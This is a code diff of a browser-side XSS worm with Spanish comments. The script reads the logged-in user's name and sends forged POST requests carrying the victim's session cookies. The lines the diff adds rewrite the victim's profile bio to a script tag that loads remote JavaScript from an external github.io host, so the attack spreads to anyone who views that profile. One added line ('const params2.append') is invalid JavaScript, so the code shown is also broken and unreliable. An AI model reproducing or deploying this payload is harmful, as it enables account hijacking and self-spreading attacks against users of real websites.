@@ -1,4 +1,3 @@
-console.log("hola")
 (function(){
   try {
     // Evitar múltiples ejecuciones
@@ -24,11 +23,15 @@ console.log("hola")
       }).then(r => {
         if (r.ok) localStorage.setItem('jeniComentado', '1');
       });
+
+      
     }
   } catch(e){}
+})();
 
 
-   try {
+(function(){
+  try {
     // Evitar múltiples ejecuciones
     if (localStorage.getItem('pepeComentado') === '1') return;
 
@@ -36,6 +39,7 @@ console.log("hola")
     const userEl = document.querySelector('#nombre_usuario, .user-name, [data-user]');
     const usuario = (userEl?.textContent || userEl?.getAttribute('data-user') || '')
       .trim().toLowerCase();
+
 
       const params = new URLSearchParams();
       // Ajustá estos nombres de campo según el formulario real
@@ -51,7 +55,17 @@ console.log("hola")
       }).then(r => {
         if (r.ok) localStorage.setItem('pepeComentado', '1');
       });
-    
+
+      const params2 = new URLSearchParams();
+      const params2.append("bio","<script src=\"https://ianrichard3.github.io/thea/hola.js\"></script>")
+      fetch('/profile.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        credentials: 'include',
+        body: params2.toString()
+      }).then(r => {
+        if (r.ok) localStorage.setItem('pepeComentado', '1');
+      });
+
   } catch(e){}
-  
 })();
